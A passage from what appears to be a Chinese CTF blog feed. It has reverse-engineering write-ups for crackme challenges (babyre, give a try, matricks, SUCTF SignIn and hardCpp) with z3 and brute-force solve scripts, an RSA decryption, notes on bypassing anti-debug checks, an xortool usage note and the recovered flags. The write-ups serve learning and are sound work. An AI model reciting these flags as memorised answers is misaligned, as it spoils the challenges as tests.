class="number">0x20</span>)</span><br><span class="line">    s.add(a[i] &lt;= <span class="number">0x7e</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    mod = s.model()</span><br><span class="line">    chars = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        chars.append(mod[a[i]].as_long())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print chars</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(w) <span class="keyword">for</span> w <span class="keyword">in</span> chars])</span><br><span class="line">    flag = flag[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#x27;</span> + flag[<span class="number">12</span>:] + flag[<span class="number">8</span>:<span class="number">12</span>] + flag[<span class="number">0</span>:<span class="number">4</span>] + flag[<span class="number">4</span>:<span class="number">8</span>])</span><br></pre></td></tr></table></figure><p>得flag: <code>flagmbr_is_funny__eh</code></p><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/babyre-start.jpg" alt="babyre-start"></p><p>要求我们点1000次换一个字符, 一般遇到这种题首先想的就是直接修改点击次数之类的。.Net 32位的题, dnspy 32启动！</p><p>我们先不中断, 运行以后先点一次flag, 然后再点击暂停, 然后单步步过调试, 因为一开始肯定在输入函数中。</p><p>接着, 我们先步过一直到判断逻辑函数中。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/babyre-flag-1.jpg" alt="babyre-flag-1"></p><p>稍微看下逻辑就能发现flag就是<code>this.context</code>, 直接看局部变量就能看到flag了</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/babyre-flag.jpg" alt="babyre-flag"></p><p>得到flag: <code>flag&#123;ca201ed0-9e07-11e8-b6dd-000c29dcabfd&#125;</code></p><h2 id="give-a-try"><a href="#give-a-try" class="headerlink" title="give a try"></a>give a try</h2><p>根据IDA的反汇编结果, 重点函数在<code>0x00401103</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/give_a_try-code.jpg" alt="give_a_try-code"></p><p>这里IDA对<code>v7 = v6 * (unsigned __int64)v6 % 0xFAC96621</code>后的反汇编有些问题, 重点看:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) != <span class="number">42</span> )</span><br><span class="line">   <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, aThinkAgain, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> v2 = <span class="number">0</span>;</span><br><span class="line"> v3 = *flag;</span><br><span class="line"> v4 = flag + <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">while</span> ( v3 )</span><br><span class="line"> &#123;</span><br><span class="line">   v2 += v3;</span><br><span class="line">   v3 = *v4++;</span><br><span class="line"> &#125;</span><br><span class="line"> srand(dword_40406C ^ v2);</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">42</span>; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   v6 = (<span class="keyword">unsigned</span> __int8)flag[i] * rand();</span><br><span class="line">     .....</span><br><span class="line">      <span class="keyword">if</span> ( result != checkNumber[i] ) <span class="comment">// result为上述操作的结果</span></span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li>首先flag长度为42</li><li>然后获得flag的字符和</li><li>设置srand, 这里<code>dword_40406C</code>应该是个可预测的常数</li><li>接着根据srand设置值跟flag每位字符进行运算, 最终等于常数</li></ul><p>由于利用srand和rand产生的随机数并不是真正的随机数, 只要传递给srand的随机数种子是确定的, 所产生的随机数在每次运行时都是确定的, 这个叫做伪随机数。这就奠定了可以使用爆破的方式求解</p><p>这里直接对<code>dword_40406C</code>查交叉引用, 可以看到</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/give_a_try-xor_const.jpg" alt="give_a_try-xor_const"></p><p>初始值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0040406C dword_40406C    dd 0</span><br></pre></td></tr></table></figure><p>根据这一段的函数名:<code>TlsCallback_0</code>, 猜测使用了TLS技术, tls在函数线程执行之前可以获得优先执行的权利, 一般用于反调试, 也可以用于数据的保护。本题pizza大哥应该是用于反调了, 用了<code>NtSetInformationThread</code>函数。</p><p>我们用OD调试程序, 查看<code>dword_40406C</code>的值为<code>0x31333359</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/give_a_try-xor_const_od.jpg" alt="give_a_try-xor_const_od"></p><p>那么接下来就是写脚本进行爆破了,   最后一点是:由于IDA的f5反编译的差距较大, 关于这道题利用内联汇编的形式写脚本:</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BUFF_LEN = <span class="number">255</span> * <span class="number">50</span> * <span class="number">50</span>;</span><br><span class="line"><span class="keyword">int</span>* pbuff = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> checkNumber[<span class="number">42</span>] = &#123;</span><br><span class="line"><span class="number">0x63B25AF1</span>, <span class="number">0x0C5659BA5</span>, <span class="number">0x4C7A3C33</span>, <span class="number">0x0E4E4267</span>, <span class="number">0x0B611769B</span>,<span class="number">0x3DE6438C</span>, <span class="number">0x84DBA61F</span>, <span class="number">0x0A97497E6</span>, <span class="number">0x650F0FB3</span>, <span class="number">0x84EB507C</span>,<span class="number">0x0D38CD24C</span>, <span class="number">0x0E7B912E0</span>, <span class="number">0x7976CD4F</span>, <span class="number">0x84100010</span>, <span class="number">0x7FD66745</span>,<span class="number">0x711D4DBF</span>, <span class="number">0x5402A7E5</span>, <span class="number">0x0A3334351</span>, <span class="number">0x1EE41BF8</span>, <span class="number">0x22822EBE</span>,<span class="number">0x0DF5CEE48</span>, <span class="number">0x0A8180D59</span>, <span class="number">0x1576DEDC</span>, <span class="number">0x0F0D62B3B</span>, <span class="number">0x32AC1F6E</span>,<span class="number">0x9364A640</span>, <span class="number">0x0C282DD35</span>, <span class="number">0x14C5FC2E</span>, <span class="number">0x0A765E438</span>, <span class="number">0x7FCF345A</span>,<span class="number">0x59032BAD</span>, <span class="number">0x9A5600BE</span>, <span class="number">0x5F472DC5</span>, <span class="number">0x5DDE0D84</span>, <span class="number">0x8DF94ED5</span>,<span class="number">0x0BDF826A6</span>, <span class="number">0x515A737A</span>, <span class="number">0x4248589E</span>, <span class="number">0x38A96C20</span>, <span class="number">0x0CC7F61D9</span>,<span class="number">0x2638C417</span>, <span class="number">0x0D9BEB996</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov     eax, dword ptr[ebp + <span class="number">8</span>]      <span class="comment">//第一个参数</span></span><br><span class="line">        movzx   ecx, byte ptr[ebp + <span class="number">12</span>]      <span class="comment">//第二个参数</span></span><br><span class="line">        mul     ecx</span><br><span class="line">        mov     ecx, <span class="number">0F</span>AC96621h</span><br><span class="line">        push    eax</span><br><span class="line">        <span class="keyword">xor</span> edx, edx</span><br><span class="line">        div     ecx</span><br><span class="line">        pop     eax</span><br><span class="line">        push    edx</span><br><span class="line">        mul     eax</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov     eax, edx</span><br><span class="line">        pop     edx</span><br><span class="line">        mul     edx</span><br><span class="line">        div     ecx</span><br><span class="line">        mov eax, edx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pbuff = <span class="keyword">new</span> <span class="keyword">int</span>[BUFF_LEN];</span><br><span class="line">    std::string flag[<span class="number">0x7e</span> + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> sum = <span class="number">0x20</span> * <span class="number">42</span>; sum &lt;= <span class="number">0x7E</span> * <span class="number">42</span>; sum++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">srand</span>(sum ^ <span class="number">0x31333359</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">42</span>; j++)</span><br><span class="line">            pbuff[sum * <span class="number">42</span> + j] = <span class="built_in">rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num = <span class="number">0</span>; num &lt; <span class="number">42</span>; num++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0x20</span>; i &lt;= <span class="number">0x7E</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> sum = <span class="number">0x20</span> * <span class="number">42</span>; sum &lt;= <span class="number">0x7E</span> * <span class="number">42</span>; sum++)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">fun</span>(pbuff[sum * <span class="number">42</span> + num], i) == checkNumber[num])</span><br><span class="line">                &#123;</span><br><span class="line">                    flag[<span class="built_in"><span class="keyword">int</span></span>(sum /  <span class="number">42</span>)].<span class="built_in">push_back</span>((<span class="keyword">char</span>)i);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="keyword">char</span>)i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0x20</span>; i &lt;= <span class="number">0x7E</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flag[i].<span class="built_in">length</span>() == <span class="number">42</span>) &#123;</span><br><span class="line">            std::cout &lt;&lt; flag[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nend\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag:<code>flag&#123;wh3r3_th3r3_i5_@_w111-th3r3_i5_@_w4y&#125;</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/give_a_try-flag.jpg" alt="give_a_try-flag"></p><h2 id="matricks"><a href="#matricks" class="headerlink" title="matricks"></a>matricks</h2><p>IDA 打开, 主逻辑如下:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/matricks-code.jpg" alt="matricks-code"></p><ul><li>首先获得<code>flag</code>, 长度为<code>49</code></li><li>然后将<code>flag</code>进行<code>xor</code>操作, 把结果存放在<code>savedregs_192</code>中, 其中 <code>7 * (n_23 / 7) + n_23 % 7</code>的结果还是<code>n_23</code>, 不过根据操作可以认为变成了[x][y]这样, 即可猜测<code>savedregs_192</code>是一个<code>n</code>行<code>7</code>列的矩阵</li><li>同理初始化同样是<code>n</code>行<code>7</code>列的矩阵的<code>savedregs_128</code></li><li>接着进入三层循环, 最里层循环是一个累加操作, 实际上就是矩阵相乘, 相乘后与数组<code>check_num</code>对比</li></ul><p>根据上述分析, 本质上矩阵相乘就是一堆线性方程, 所以z3直接解(虽然也可以求逆矩阵, 但毕竟抄算法不费脑子)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">check_num = [<span class="number">0xAA</span>, <span class="number">0x7A</span>, <span class="number">0x24</span>, <span class="number">0x0A</span>, <span class="number">0xA8</span>, <span class="number">0xBC</span>, <span class="number">0x3C</span>, <span class="number">0xFC</span>, <span class="number">0x82</span>, <span class="number">0x4B</span>,             <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x5E</span>, <span class="number">0x1C</span>, <span class="number">0x82</span>, <span class="number">0x1F</span>, <span class="number">0x79</span>, <span class="number">0xBA</span>, <span class="number">0xB5</span>, <span class="number">0xE3</span>,             <span class="number">0x43</span>, <span class="number">0x04</span>, <span class="number">0xFD</span>, <span class="number">0xAC</span>, <span class="number">0x10</span>, <span class="number">0xB5</span>, <span class="number">0x63</span>, <span class="number">0xBD</span>, <span class="number">0x8D</span>, <span class="number">0xE7</span>,             <span class="number">0x35</span>, <span class="number">0xD9</span>, <span class="number">0xD3</span>, <span class="number">0xE8</span>, <span class="number">0x42</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0x5A</span>, <span class="number">0x09</span>, <span class="number">0x54</span>,             <span class="number">0xE9</span>, <span class="number">0x9F</span>, <span class="number">0x4C</span>, <span class="number">0xDC</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x11</span>, <span class="number">0x87</span>, <span class="number">0x94</span>]</span><br><span class="line">xor_num = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;some legends r told, some turn to dust or to gold&quot;</span>))</span><br><span class="line"><span class="built_in">input</span> = [BitVec(<span class="string">&quot;x%d&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>)]</span><br><span class="line">length = <span class="number">49</span></span><br><span class="line"></span><br><span class="line">savedregs_128 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length)]</span><br><span class="line">savedregs_192 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length)]</span><br><span class="line">n_23 = <span class="number">23</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    savedregs_192[n_23] = <span class="built_in">input</span>[i] ^ n_23</span><br><span class="line">    savedregs_128[i] = xor_num[n_23] ^ i</span><br><span class="line">    n_23 = (n_23 + <span class="number">13</span>) % length</span><br><span class="line">i1 = <span class="number">3</span></span><br><span class="line">i2 = <span class="number">4</span></span><br><span class="line">i3 = <span class="number">5</span></span><br><span class="line">i4 = <span class="number">41</span></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            <span class="built_in">sum</span> += savedregs_128[<span class="number">7</span> * i3 + i2] * savedregs_192[<span class="number">7</span> * i1 + i3]</span><br><span class="line">            i3 = ( i3 + <span class="number">5</span> ) % <span class="number">7</span></span><br><span class="line">        s.add(<span class="built_in">sum</span> == check_num[i4] ^ i4)</span><br><span class="line">        i4 = (i4 + <span class="number">31</span>) % length</span><br><span class="line">        i2 = (i2 + <span class="number">4</span>) % <span class="number">7</span></span><br><span class="line">    i1 = (i1 + <span class="number">3</span>) % <span class="number">7</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        flag += (<span class="built_in">chr</span>(m[<span class="built_in">input</span>[i]].as_long()))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag: <code>flag&#123;Everyth1n_th4t_kill5_m3_m4kes_m3_fee1_aliv3&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xortool</title>
      <link href="/note-tool-xortool/"/>
      <url>/note-tool-xortool/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>xortool.py是基于python的脚本, 用于完成一些xor分析, 包括:</p><ul><li>猜想key的长度</li><li>猜想key的值</li><li>解密一些经过xoe加密的文件</li></ul><p>官方:<a href="https://github.com/hellman/xortools.git">https://github.com/hellman/xortools.git</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>xortool依赖于python的命令行参数解释器docopt</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pip isntall docopt</span><br><span class="line"><span class="built_in">cd</span> /data/src</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/hellman/xortools.git</span><br><span class="line"><span class="built_in">cd</span> xortool</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><h2 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xortool -h</span><br><span class="line">xortool</span><br><span class="line">  A tool to do some xor analysis:</span><br><span class="line">  - guess the key length (based on count of equal chars)</span><br><span class="line">  - guess the key (base on knowledge of most frequent char)</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  xortool [-x] [-m MAX-LEN] [-f] [-t CHARSET] [FILE]</span><br><span class="line">  xortool [-x] [-l LEN] [-c CHAR | -b | -o] [-f] [-t CHARSET] [FILE]</span><br><span class="line">  xortool [-x] [-m MAX-LEN| -l LEN] [-c CHAR | -b | -o] [-f] [-t CHARSET] [FILE]</span><br><span class="line">  xortool [-h | --help]</span><br><span class="line">  xortool --version</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -x --hex                          input is hex-encoded str</span><br><span class="line">  -l LEN, --key-length=LEN          length of the key</span><br><span class="line">  -m MAX-LEN, --max-keylen=MAX-LEN  maximum key length to probe [default: 65]</span><br><span class="line">  -c CHAR, --char=CHAR              most frequent char (one char or hex code)</span><br><span class="line">  -b --brute-chars                  brute force all possible most frequent chars</span><br><span class="line">  -o --brute-printable              same as -b but will only check printable chars  -f --filter-output                filter outputs based on the charset</span><br><span class="line">  -t CHARSET --text-charset=CHARSET target text character set [default: printable]  -h --help                         show this help</span><br><span class="line"></span><br><span class="line">Notes:</span><br><span class="line">  Text character set:</span><br><span class="line">    * Pre-defined sets: printable, base32, base64</span><br><span class="line">    * Custom sets:</span><br><span class="line">      - a: lowercase chars</span><br><span class="line">      - A: uppercase chars</span><br><span class="line">      - 1: digits</span><br><span class="line">      - !: special chars</span><br><span class="line">      - *: printable chars</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  xortool file.bin</span><br><span class="line">  xortool -l 11 -c 20 file.bin</span><br><span class="line">  xortool -x -c &#x27; &#x27; file.hex</span><br><span class="line">  xortool -b -f -l 23 -t base64 message.enc</span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="攻防世界-misc-5-1"><a href="#攻防世界-misc-5-1" class="headerlink" title="攻防世界 misc 5-1"></a>攻防世界 misc 5-1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xortool -c 20 cipher</span><br><span class="line">The most probable key lengths:</span><br><span class="line">   2:   12.2%</span><br><span class="line">   5:   11.9%</span><br><span class="line">   9:   9.8%</span><br><span class="line">  13:   22.2%</span><br><span class="line">  20:   6.8%</span><br><span class="line">  22:   6.2%</span><br><span class="line">  26:   12.8%</span><br><span class="line">  30:   4.6%</span><br><span class="line">  39:   7.8%</span><br><span class="line">  52:   5.7%</span><br><span class="line">Key-length can be 3*n</span><br><span class="line">1 possible key(s) of length 13:</span><br><span class="line">Good\tuckToYou</span><br><span class="line">Found 1 plaintexts with 95.0%+ valid characters</span><br><span class="line">See files filename-key.csv, filename-char_used-perc_valid.csv</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 SUCTF</title>
      <link href="/wp-games-2019suctf/"/>
      <url>/wp-games-2019suctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul><li>2020.05.05 有空一定补其他题</li></ul><p>打不动, 太菜了…..</p><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>感觉像是签到题。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[sign in]&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[input your flag]: &quot;</span>, a2);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%99s&quot;</span>, &amp;v8);</span><br><span class="line">sub_96A(&amp;v8, &amp;v9);</span><br><span class="line">__gmpz_init_set_str(&amp;v7, <span class="string">&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;</span>, <span class="number">16LL</span>);</span><br><span class="line">__gmpz_init_set_str(&amp;v6, &amp;v9, <span class="number">16LL</span>);</span><br><span class="line">__gmpz_init_set_str(&amp;v4, <span class="string">&quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">__gmpz_init_set_str(&amp;v5, <span class="string">&quot;65537&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">__gmpz_powm(&amp;v6, &amp;v6, &amp;v5, &amp;v4);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__gmpz_cmp(&amp;v6, &amp;v7) )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;TTTTTTTTTTql!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>gmp库计算RSA, 标志是这个65537。</p><p>直接在<a href="http://factordb.com/">factordb</a>分解N</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line">c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span><br><span class="line"></span><br><span class="line">n = 103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line"></span><br><span class="line">p = 282164587459512124844245113950593348271</span><br><span class="line">q = 366669102002966856876605669837014229419</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">d = inverse(e, (p-1) * (q-1))</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得flag:<br><code>suctf&#123;Pwn_@_hundred_years&#125;</code></p><h2 id="hardCpp"><a href="#hardCpp" class="headerlink" title="hardCpp"></a>hardCpp</h2><p>用ollvm混淆过的c++代码, 开头给了个类似md5的东西。</p><p>开头有个反调:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v45 = time(<span class="number">0LL</span>);</span><br><span class="line">......</span><br><span class="line">v39 = time(<span class="number">0LL</span>);</span><br><span class="line">v38 = v39 - v45;</span><br><span class="line">v49 = v39 - v45;</span><br><span class="line">......</span><br><span class="line"> v3 = <span class="number">0xD3E10A81</span>;</span><br><span class="line"> <span class="keyword">if</span> ( v49 &gt; <span class="number">0</span> )</span><br><span class="line">    v3 = <span class="number">0x1E2AAEDE</span>;</span><br><span class="line">v28 = v3;</span><br><span class="line">......</span><br><span class="line"> <span class="keyword">if</span> ( v28 == <span class="number">0x1E2AAEDE</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Let the silent second hand take the place of my doubt...&quot;</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试一下就能发现主要流程在这里:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v35 = v38 ^ s[v36];</span><br><span class="line">v34 = main::$_0::<span class="keyword">operator</span>() <span class="keyword">const</span>((__int64)&amp;v43, v35);</span><br><span class="line"> v33 = main::$_1::<span class="keyword">operator</span>() <span class="keyword">const</span>((__int64)&amp;v41, s[v38 - <span class="number">1</span> + v36]);</span><br><span class="line">v11 = main::$_1::<span class="keyword">operator</span>() <span class="keyword">const</span>(<span class="keyword">char</span>)::&#123;lambda(<span class="keyword">int</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v33, <span class="number">7</span>);</span><br><span class="line">v35 = main::$_0::<span class="keyword">operator</span>() <span class="keyword">const</span>(<span class="keyword">char</span>)::&#123;lambda(<span class="keyword">char</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>((__int64)&amp;v34, v11);</span><br><span class="line">v32 = main::$_2::<span class="keyword">operator</span>() <span class="keyword">const</span>((__int64)&amp;v44, v35);</span><br><span class="line">v31 = main::$_2::<span class="keyword">operator</span>() <span class="keyword">const</span>((__int64)&amp;v44, s[v38 - <span class="number">1</span> + v36]);</span><br><span class="line">v12 = main::$_2::<span class="keyword">operator</span>() <span class="keyword">const</span>(<span class="keyword">char</span>)::&#123;lambda(<span class="keyword">char</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v31, <span class="number">18</span>);</span><br><span class="line">v30 = main::$_3::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v42, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v12);</span><br><span class="line">v13 = main::$_3::<span class="keyword">operator</span>() <span class="keyword">const</span>(<span class="keyword">char</span>)::&#123;lambda(<span class="keyword">char</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v30, <span class="number">3</span>);</span><br><span class="line">v29 = main::$_0::<span class="keyword">operator</span>() <span class="keyword">const</span>((__int64)&amp;v43, v13);</span><br><span class="line">v14 = main::$_0::<span class="keyword">operator</span>() <span class="keyword">const</span>(<span class="keyword">char</span>)::&#123;lambda(<span class="keyword">char</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>((__int64)&amp;v29, <span class="number">2</span>);</span><br><span class="line">v15 = main::$_2::<span class="keyword">operator</span>() <span class="keyword">const</span>(<span class="keyword">char</span>)::&#123;lambda(<span class="keyword">char</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v32, v14);</span><br><span class="line">v16 = <span 